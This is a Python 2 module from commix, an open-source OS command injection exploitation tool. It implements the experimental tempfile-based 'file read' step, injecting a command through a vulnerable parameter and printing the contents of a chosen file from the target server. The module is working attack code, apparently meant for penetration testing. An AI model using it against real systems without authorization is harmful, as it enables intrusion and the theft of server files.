#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
      
  # Read file
  if menu.options.file_read:
    file_to_read = menu.options.file_read
    cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    shell = output 
    shell = "".join(str(p) for p in shell)
    if shell:
      if menu.options.verbose:
	print ""
      sys.stdout.write(colors.BOLD + "\n\n (!) Contents of file " + colors.UNDERL + file_to_read + colors.RESET + " : ")
      sys.stdout.flush()
      print shell
    else:
     sys.stdout.write(colors.BGRED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + colors.RESET)
     sys.stdout.flush()
      
# eof